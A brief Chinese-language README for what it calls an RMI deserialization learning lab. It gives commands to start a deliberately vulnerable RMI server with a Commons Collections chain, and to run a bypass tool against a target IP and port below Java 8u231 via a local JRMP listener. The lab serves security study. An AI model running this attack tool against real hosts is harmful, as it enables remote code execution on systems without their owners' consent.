# RMIDeserialize
RMI反序列化学习环境，细节请参考博客

`java -cp RMIDeserialize.jar com.lala.ServerAndRegister` ：起一个包含CC链可以被攻击的RMI服务

`java -jar RMI-Bypass290.jar <攻击目标IP> <攻击目标端口> <本地JRMP服务IP> <本地JRMP服务端口>`：攻击目标8u231版本以下的RMI服务。

其他功能可以从源码运行。
